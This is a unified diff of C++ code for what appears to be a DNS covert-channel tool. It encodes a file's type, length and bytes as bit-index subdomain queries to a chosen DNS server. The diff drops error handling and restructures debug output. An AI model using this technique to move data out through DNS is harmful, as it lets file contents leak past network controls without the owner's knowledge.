@@ -21,21 +21,17 @@ using namespace std;
 #define DEBUG_COUT(x) do {} while(0)
 #endif
 
-atomic<bool> has_error(false);
-
 void transmit(vector<string> domains, string dns_server){
     DnsTcpClient client;
     if (!client.connect_to(dns_server, "53")) {
         cerr << "connect failed\n";
-        has_error.store(true);
         return;
     }
     vector<uint8_t> resp;
     for (const auto& qd : domains) {
-        DEBUG_COUT(cout << "sending: " << qd << "\n";);
+        DEBUG_COUT(cout << "sending: " << qd << "......\n";);
         if (!client.query_raw(qd, resp)) {
             cerr << "query_raw failed: " << qd << "\n";
-            has_error.store(true);
             break;
         }
     }
@@ -89,37 +85,37 @@ bool send_message(string filename, string nxdomain, string dns_server, int num_t
     bitset<8> b_type(type[0]);
     vector<string> type_domains;
     for (size_t i = 0; i < b_type.size(); i++) {
-        DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
         if (b_type[i] == 1) {
             type_domains.push_back(to_string(i) + "." + nxdomain);         
         }
     }
+
+#ifdef DEBUG
+    cout << "b_type: " << b_type << "\n";
+#endif
+
     if (!type_domains.empty())
         workers.emplace_back(transmit, type_domains, dns_server);
-
+        
     for (auto& t: workers) t.join();
     workers.clear();
-    if (has_error.load()) {
-        delete[] value;
-        return false;
-    }
 
     // Step2: Send length (24-bit) 
     for (size_t i = 0; i < 3; i++) {
         bitset<8> b_length(length[i]);
         vector<string> domains;
 
-        DEBUG_COUT(cout << "===================\n" 
-             << "length[" << i << "]: " << length[i] << "  "
-             << "b_length holds " << b_length << endl;);
-
         for (size_t j = 0; j < b_length.size(); j++) {
-            DEBUG_COUT(cout << "b_length[" << 8+i*8+j << "]: " << b_length[j] << endl;);
             if (b_length[j] == 1) {
                 int index = 8 + i*8 + j;
                 domains.push_back(to_string(index) + "." + nxdomain);
             }
         }
+
+#ifdef DEBUG
+    cout << "length[" << i << "]: " << length[i]
+        << "\tb_length: " << b_length << "\n";
+#endif
 
         if (!domains.empty())
             workers.emplace_back(transmit, domains, dns_server);
@@ -127,42 +123,36 @@ bool send_message(string filename, string nxdomain, string dns_server, int num_t
 
     for(auto& t: workers) t.join();
     workers.clear();
-    if (has_error.load()) {
-        delete[] value;
-        return false;
-    }
 
     // Step3: Send value
     for (size_t i = 0; i < size; i++) {
         bitset<8> bits(value[i]);
         vector<string> domains;
 
-        DEBUG_COUT(cout << "===================\n"
-             << "value[" << i << "]: " << value[i] << "  "
-             << "bits holds " << bits << endl;);
-
         for (size_t j = 0; j < bits.size(); j++) {
-            DEBUG_COUT(cout << "bits[" << 32 + i*8+j << "]: " << bits[j] << endl;);
             if (bits[j] == 1) {
                 int index = 32 + i*8 + j;
                 domains.push_back(to_string(index) + "." + nxdomain);
             }
         }
 
+#ifdef DEBUG
+    cout << "value[" << i << "]: " << value[i]
+        << "\tb_value: " << bits << "\n";
+#endif
+
         if(!domains.empty()) {
             workers.emplace_back(transmit, domains, dns_server);
             
-            if ((int)workers.size() == num_threads || i == size - 1) {
+            if ((int)workers.size() == num_threads) {
                 for (auto& t: workers) t.join();
                 workers.clear();
-                if (has_error.load()) {
-                    delete[] value;
-                    return false;
-                }
             }
         }
     }
        
+    for (auto& t: workers) t.join();
+    workers.clear();
     // free memory
     delete[] value;
     return true;
